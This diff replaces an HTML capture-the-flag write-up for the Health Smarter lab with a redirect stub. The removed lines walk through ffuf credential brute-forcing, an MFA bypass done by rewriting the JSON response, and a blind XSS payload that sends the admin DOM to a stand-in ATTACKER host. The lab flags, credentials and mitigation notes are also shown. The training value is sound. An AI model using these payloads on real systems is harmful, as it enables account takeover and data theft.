@@ -2,100 +2,11 @@
 <html lang="en">
 <head>
 <meta charset="utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>HackSmarter Health Smarter — MFA client trust + Blind XSS</title>
-<style>
-  :root { --bg:#0b111b; --panel:#121a27; --text:#e6eef7; --muted:#9fb0c3; --good:#5ddea8; --code:#1a2433; --border:#243246; }
-  * { box-sizing: border-box; }
-  body { margin:0; font-family:"Segoe UI",system-ui,sans-serif; background:var(--bg); color:var(--text); line-height:1.65; }
-  .wrap { max-width:920px; margin:0 auto; padding:48px 24px 96px; }
-  h1 { font-size:1.85rem; margin:0 0 0.4em; }
-  h2 { font-size:1.4rem; margin-top:2.2em; border-bottom:1px solid var(--border); padding-bottom:0.35em; }
-  .muted { color:var(--muted); }
-  .hero { background:linear-gradient(145deg,#152033,#0f1622 55%,#1a1020); border:1px solid var(--border); border-radius:16px; padding:28px; margin-bottom:2rem; }
-  .pill { display:inline-block; background:rgba(239,50,87,0.15); color:#ff7a95; border:1px solid rgba(239,50,87,0.4); border-radius:999px; padding:0.2em 0.75em; font-size:0.8rem; font-weight:600; text-transform:uppercase; }
-  table.meta { width:100%; border-collapse:collapse; margin:1rem 0; }
-  table.meta td { padding:0.35em 0.5em; border-bottom:1px solid var(--border); vertical-align:top; }
-  table.meta td:first-child { color:var(--muted); width:30%; }
-  pre { background:var(--code); border:1px solid var(--border); border-radius:10px; padding:14px 16px; overflow-x:auto; font-size:0.82rem; }
-  code { font-family:ui-monospace,Menlo,Consolas,monospace; color:#c9e4ff; }
-  figure { margin:1.5rem 0; background:var(--panel); border:1px solid var(--border); border-radius:12px; padding:10px; }
-  figure img { max-width:100%; height:auto; display:block; border-radius:8px; }
-  figcaption { color:var(--muted); font-size:0.88rem; margin-top:0.6rem; }
-  .flag { background:#0e1f18; border:1px solid rgba(93,222,168,0.45); color:var(--good); font-family:ui-monospace,Menlo,Consolas,monospace; padding:14px 16px; border-radius:10px; margin:1rem 0; }
-  .why { background:rgba(59,130,246,0.08); border-left:3px solid #3b82f6; padding:0.75rem 1rem; margin:0.75rem 0 1rem; border-radius:0 8px 8px 0; }
-  a { color:#7cb8ff; }
-  footer { margin-top:3rem; color:var(--muted); font-size:0.9rem; }
-</style>
+<meta http-equiv="refresh" content="0; url=../web/health-smarter/" />
+<link rel="canonical" href="https://mccleod1290.github.io/hack-smarter-labs/web/health-smarter/" />
+<title>Moved</title>
 </head>
-<body>
-<div class="wrap">
-<div class="hero">
-  <span class="pill">HackSmarter · Web · Medium</span>
-  <h1>Health Smarter: JSON MFA trust + Blind XSS admin DOM</h1>
-  <p class="muted">Authorized lab. Author: Tyler Ramsbey. Solved 2026-08-07.</p>
-</div>
-
-<table class="meta">
-  <tr><td>Target</td><td><code>10.1.124.164</code> · Express on :80</td></tr>
-  <tr><td>Valid user</td><td><code>m.thompson@healthsmarter.hsm</code> / <code>Care4All!</code></td></tr>
-  <tr><td>Flag 1</td><td><code>HSM{e78322f22ccb4eb8b4277e8491e00982}</code></td></tr>
-  <tr><td>Flag 2</td><td><code>HSM{35dca15a0eb94bd781f82ff45f070bff}</code></td></tr>
-</table>
-
-<figure>
-  <img src="images/01-login.png" alt="Login portal" />
-  <figcaption>Figure 1 — Staff &amp; Patient Portal login (JSON <code>/api/login</code>).</figcaption>
-</figure>
-
-<h2>1. Valid credentials</h2>
-<pre><code>POST /api/login
-{"username":"m.thompson@healthsmarter.hsm","password":"Care4All!"}
-→ {"success":true,"redirect":"/mfa.html"}</code></pre>
-<p>Use the challenge username/password lists with ffuf clusterbomb; filter on size ≠ 77 (failed login).</p>
-<div class="flag">Valid user: m.thompson@healthsmarter.hsm</div>
-
-<h2>2. Flag 1 — MFA client-side trust</h2>
-<p>After password login the app sends you to MFA. The SPA only checks JSON fields:</p>
-<pre><code>// mfa.html (conceptually)
-if (data.success) window.location.href = data.redirect;</code></pre>
-<p><strong>Bypass:</strong> intercept <code>POST /api/mfa/verify</code> failure and replace body with:</p>
-<pre><code>{"success": true, "redirect": "/dashboard.html"}</code></pre>
-<p>Also observed: <code>dashboard.html</code> is reachable while <code>mfaVerified:false</code> (server-side gap). Flag 1 is on the patient dashboard.</p>
-<figure>
-  <img src="images/02-patient-flag1.png" alt="Patient dashboard flag 1" />
-  <figcaption>Figure 2 — Patient portal after MFA bypass.</figcaption>
-</figure>
-<div class="flag">FLAG 1: HSM{e78322f22ccb4eb8b4277e8491e00982}</div>
-
-<h2>3. Flag 2 — Blind XSS ticket → admin DOM</h2>
-<p>Helpdesk form posts to <code>/api/tickets</code> (needs <code>Referer: …/dashboard.html</code>). Admin panel loads tickets and injects <code>message</code> via <code>innerHTML</code> (re-executes scripts).</p>
-<p><code>HttpOnly</code> blocks <code>document.cookie</code> theft. Exfiltrate the rendered page instead:</p>
-<pre><code>&lt;script&gt;
-fetch('http://ATTACKER:8902/x?html='+encodeURIComponent(document.documentElement.outerHTML))
-&lt;/script&gt;</code></pre>
-<div class="why">
-  <strong>Why:</strong> Admin bot reviews tickets → XSS runs as Admin (Dr. Elizabeth Kennedy) → DOM dump includes Flag 2 hardcoded in the Executive Staff Portal.
-</div>
-<figure>
-  <img src="images/04-admin-portal-dom.png" alt="Admin portal DOM" />
-  <figcaption>Figure 3 — Exfiltrated admin dashboard DOM (cleaned of active XSS for viewing).</figcaption>
-</figure>
-<figure>
-  <img src="images/03-admin-flag2.png" alt="Flags summary" />
-  <figcaption>Figure 4 — Both flags recovered.</figcaption>
-</figure>
-<div class="flag">FLAG 2: HSM{35dca15a0eb94bd781f82ff45f070bff}</div>
-
-<h2>Beyond Root</h2>
-<ul>
-  <li>Server must issue MFA-complete session tokens; never navigate on client-only JSON.</li>
-  <li>Sanitize ticket HTML; CSP; encode before <code>innerHTML</code>.</li>
-  <li><code>HttpOnly</code> is necessary but not sufficient against XSS (DOM/data exfil).</li>
-  <li>Rate-limit credential stuffing; lock accounts after N failures.</li>
-</ul>
-
-<footer>Authorized HackSmarter lab · mccleod1290.github.io · 2026-08-07</footer>
-</div>
+<body style="background:#0b0f14;color:#e8eef6;font-family:system-ui;padding:2rem">
+  <p>This writeup moved to <a style="color:#93c5fd" href="../web/health-smarter/">/hack-smarter-labs/web/health-smarter/</a>.</p>
 </body>
 </html>
